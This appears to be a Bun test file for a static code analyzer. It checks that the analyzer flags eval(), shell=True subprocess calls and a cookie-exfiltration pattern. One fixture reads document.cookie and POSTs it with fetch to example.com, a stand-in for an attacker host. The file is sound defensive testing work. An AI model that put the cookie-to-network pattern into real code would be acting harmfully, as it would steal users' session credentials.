import { describe, expect, test } from "bun:test";
import { analyzeCode } from "./code-analyzer";

describe("analyzeCode", () => {
  test("detects eval outside comments", () => {
    const js = `// eval('x') in comment
const x = 1;
eval("alert(1)");
`;
    const findings = analyzeCode("/tmp/a.js", js, "javascript");
    const hit = findings.find((f) => f.ruleId === "CODE_JS_EVAL_OR_FUNCTION");
    expect(Boolean(hit)).toBe(true);
    expect(hit?.severity).toBe("HIGH");
    expect(hit?.line).toBe(3);
  });

  test("detects cookie + fetch exfil pattern", () => {
    const js = `
const c = document.cookie;
fetch("https://example.com", { method: "POST", body: c });
`;
    const findings = analyzeCode("/tmp/a.js", js, "javascript");
    expect(findings.some((f) => f.ruleId === "CODE_JS_EXFIL_SOURCES_TO_NETWORK")).toBe(true);
  });

  test("detects subprocess shell=True", () => {
    const py = `
import subprocess
subprocess.run("echo hi", shell=True)
`;
    const findings = analyzeCode("/tmp/a.py", py, "python");
    const hit = findings.find((f) => f.ruleId === "CODE_PY_SUBPROCESS_SHELL_TRUE");
    expect(Boolean(hit)).toBe(true);
    expect(hit?.severity).toBe("HIGH");
  });
});

